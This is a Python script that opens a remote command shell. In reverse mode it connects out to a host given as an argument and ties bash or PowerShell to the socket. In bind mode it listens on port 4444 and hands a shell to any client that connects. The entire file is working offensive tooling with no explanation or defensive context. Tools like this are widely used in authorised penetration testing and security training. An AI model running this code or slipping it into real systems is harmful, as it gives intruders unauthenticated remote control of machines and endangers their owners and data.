#!/usr/bin/env python3

from socket import socket, AF_INET, SOCK_STREAM
from sys import argv
import subprocess
import os

BUFFER_SIZE = 512

def init_shell(s, shell):
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    return subprocess.call([shell])

def get_parameters():
    params = dict(
        reverse=False
    )
    for param in argv[1:]:
        if param == '--windows':
            params['shell'] = 'powershell.exe'
            continue
        if param == "-h" or param == "--help":
            params['help'] = True
            continue
        if param == "--reverse" or param == "-r":
            params['reverse'] = True
            continue
        if not params.get('host'):
            params['host'] = param
            continue
    if not params.get('shell'):
        params['shell'] = '/bin/bash'
    return params

def usage():
    print("""usage : %s [options]
Options :
    -r --reverse : Start a reverse shell. Must be followed by a host or host:port""" %argv[0])
    return 0

def start_reverse_tcp(shell, host, port=4444):
    if ":" in host:
        host, port = host.split(":")
    s = socket(AF_INET, SOCK_STREAM)
    s_addr = (host, int(port))
    s.connect(s_addr)
    listen = True
    init_shell(s, shell)

def start_tcp_bind(shell, host="0.0.0.0", port=4444): 
    if ":" in host:
        host, port = host.split(":")
    print('host is', host, port)
    s = socket(AF_INET, SOCK_STREAM)
    s_addr = (host, int(port))
    s.bind(s_addr)
    s.listen(1)
    listen = True
    print("Listening for TCP connections on %s:%s" %(host, port))
    while listen:
        connection, c_addr = s.accept()
        init_shell(connection, shell)
    s.close()

def main():
    params = get_parameters()
    if params.get('help'):
        return usage()
    print('params are', params)
    if params.get('reverse'):
        start_reverse_tcp(params.get('shell'), params['host'])
    else:
        if params.get('host'):
            start_tcp_bind(params.get('shell'), params.get('host'))
        else:
            start_tcp_bind(params.get('shell'))
    return

if __name__ == "__main__":
    main()
